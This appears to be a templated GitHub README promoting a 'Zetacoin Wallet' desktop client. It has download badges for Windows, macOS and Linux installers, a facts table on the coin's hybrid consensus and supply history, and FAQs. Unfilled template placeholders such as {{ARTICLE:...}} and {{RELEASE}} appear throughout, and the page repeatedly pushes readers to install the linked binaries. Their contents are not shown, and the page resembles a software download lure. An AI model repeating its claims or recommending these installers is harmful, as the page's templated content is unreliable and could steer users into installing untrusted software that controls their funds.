![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">What Is Zetacoin? The Scrypt Coin Behind the ZET Wallet</h1>

<p align="center">What the Zetacoin desktop wallet is, who keeps it running, and how to tell a real download from a lookalike.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

Zetacoin (ZET) is an open-source cryptocurrency that launched on 3 August 2013 and has produced blocks continuously since. It runs on a hybrid Scrypt Proof-of-Work and Proof-of-Stake network with 30-second blocks, and Zetacoin Wallet is the desktop client that holds ZET, stakes it, mines it and runs a full node on your machine.

## Key facts at a glance

| Property | Value |
| --- | --- |
| Name and ticker | Zetacoin, ZET |
| Launched | 3 August 2013, blocks produced without interruption since |
| Consensus | Hybrid Proof-of-Work and Proof-of-Stake |
| Hashing algorithm | Scrypt, since the 2021 rebuild |
| Block time | 30 seconds for both PoW and PoS blocks |
| Block rewards | approximately 0.1 ZET PoW, fixed 0.0625 ZET PoS |
| Annual emission | under 50,000 ZET, below 0.1% of supply per year |
| Address format | `9...` on the current chain, `Z...` on the retired chain |
| Network and RPC ports | 17333 and 6332 |
| Data directory | `%AppData%/zetacoin/`, `~/.zetacoin/`, `~/Library/Application Support/zetacoin/` |
| Client | Zetacoin Wallet, open source, Windows, macOS and Linux |

The full walk-through, with the checks in order, is in [Is Zetacoin Still Active in 2026?](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/is-the-chain-still-active.md).

## How the hybrid consensus works

Zetacoin pays for two kinds of block. A Proof-of-Work block pays roughly 0.1 ZET to a Scrypt miner, and a Proof-of-Stake block pays a flat 0.0625 ZET to a wallet holding mature coins. Both are produced on the same 30-second schedule, so the chain advances whether or not anyone is mining at that moment.

That split is why the network keeps moving on modest hardware. Staking needs no minimum balance and no dedicated server: the wallet must be running, synced, and unlocked for staking only. Coins become eligible after roughly eight hours of maturity, which protects the chain from coin-age gaming and explains why a freshly received balance does not stake on the first block.

Combined emission stays under 50,000 ZET a year, under a tenth of one percent of supply. Zetacoin is therefore a low-inflation chain rather than a deflationary one, and the reward is deliberately small enough that it does not depend on price to keep block production rational.

## Where the supply came from

The 2013 chain was a Bitcoin-derived SHA-256 coin with a 160 million cap, and it exceeded that cap before the transition. The current Scrypt chain began with the 2021 rebuild, carries roughly 60 million ZET in circulation, and its post-burn total is approximately 59.9 million ZET.

The 2021 change was a full migration, not a fork of convenience. Holders moved old coins to the new chain one for one, and the migration window closed on 1 August 2022. Everything unclaimed at that point  -  old-chain balances and the projected unclaimed new-chain allocation  -  was burned to an address with no private key. The old SHA-256 chain still exists, but its coins are no longer exchangeable, which is why an address beginning with `Z` and an address beginning with `9` are not the same thing.

For the background behind this step, [Zetacoin vs ZetaChain: Two Different Projects](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/zet-vs-zetachain-key-differences.md) covers the same ground in more detail.

## What a holder can do with ZET

ZET is a payment and block-production asset. You can send and receive it, stake it from the desktop wallet, mine it with Scrypt hardware, run a full node, and hold it in the desktop client or in a supporting third-party wallet.

Sending is ordinary: paste a `9...` address, choose a fee, broadcast, and wait for confirmations. Staking is passive once the wallet is synced and unlocked. Mining is open to any Scrypt-capable device, including Scrypt ASICs and GPUs configured for Scrypt, and it can run on the same machine that stakes. All three activities settle on the same 30-second chain.

Because the chain is a full node rather than a remote API, the client also verifies what it shows you. That is the practical difference between holding ZET in the desktop wallet and holding an IOU on a third-party service: the balance is checked against blocks your own machine validated.

## Which client to use, and where it keeps your keys

Zetacoin Wallet is the official desktop client for Windows 10 and 11 64-bit, macOS 12 and later on Intel and Apple Silicon, and Linux on Ubuntu 20.04 or newer, Debian and Mint. It needs 2 GB of RAM and about 1 GB of free disk space for chain data.

The keys live in `wallet.dat` inside the data directory, and that file is the thing to back up. There is no seed phrase to write down, so a lost disk with no copy of `wallet.dat` means lost coins  -  the wallet cannot regenerate keys from a twelve-word list because it never used one. Encryption uses AES-256-CBC, and there is no passphrase recovery mechanism, which is why the passphrase deserves the same care as the file.

Running the client over an older installation needs one precaution: the new wallet uses the same data directory as the legacy one, so back up and move the old chain before installing. That single step prevents the most common "my new wallet will not sync" report.

## Zetacoin is not ZetaChain

The two names are constantly confused, and the confusion costs people money. Zetacoin trades as ZET and uses `9...` addresses on its own Scrypt chain; ZetaChain is a separate project with its own token and network. A wallet, an exchange page or an airdrop that mixes the two is not describing this coin.

The reliable test is mechanical rather than verbal: check the ticker, check the address prefix, and check that the software is Zetacoin Wallet from the project's own release page. Anything that asks for a ZETA deposit while promising Zetacoin returns is a different product wearing a similar name. {{ARTICLE:zetacoin-vs-zetachain-key-differences}} goes through the differences line by line.

## Is the network alive?

Yes. The chain is past block 4.6 million, blocks arrive minutes apart, the network reports around fourteen peers, and both PoW and PoS blocks appear in the same window. A public ZET block explorer shows the height climbing without gaps.

That is worth stating plainly because several third-party pages still describe the coin from the 2018-2021 period. Zetacoin is maintained by EWMCI, LLC, the client is actively developed, and the current release is available from the GitHub releases page. If a site calls the network inactive, it is reading an old snapshot, not the chain.

## Common questions

### Is Zetacoin the same as ZetaChain?

No. Zetacoin is a Scrypt Proof-of-Work and Proof-of-Stake chain that launched in 2013 and trades as ZET. ZetaChain is a separate project with a separate token and network, and the two share nothing but a similar name.

### Is Zetacoin a fork of Bitcoin?

Only historically. The 2013 launch was Bitcoin-derived and used SHA-256, but the current chain uses Scrypt with hybrid PoW and PoS and has its own supply history, so it behaves differently from Bitcoin in block time, rewards and consensus.

### How many Zetacoins are there?

Approximately 59.9 million ZET after the 2022 burn, with fewer than 50,000 new coins issued per year across mining and staking. The legacy chain's 160 million cap belongs to the retired chain and is not the current supply.

### Does Zetacoin still get new blocks?

Yes, on a 30-second target for both block types. Staking alone can advance the chain, which is why the network does not stall when mining hashrate drops.

## Getting the current release

Download Zetacoin Wallet from the GitHub releases page and run the build for your platform; that is the only copy you should install. {{RELEASE}} publishes each release with its notes, and {{ARTICLE:where-to-download-official-zetacoin-wallet}} explains how to tell the official download from a lookalike.

Once installed, the next useful steps are backing up `wallet.dat` ({{ARTICLE:how-to-backup-zetacoin-wallet}}) and getting the chain synced ({{ARTICLE:zetacoin-wallet-not-syncing-fix}}). If you want to earn from the balance rather than just hold it, {{ARTICLE:how-to-stake-zetacoin-coins}} covers the staking setup, and {{ARTICLE:zetacoin-wallet-desktop-client-guide}} walks through what the client does on first launch.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [What the Zetacoin Desktop Client Does](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/what-the-desktop-client-does.md)
- [Is Zetacoin Still Active in 2026?](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/is-the-chain-still-active.md)
- [Zetacoin vs ZetaChain: Two Different Projects](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/zet-vs-zetachain-key-differences.md)
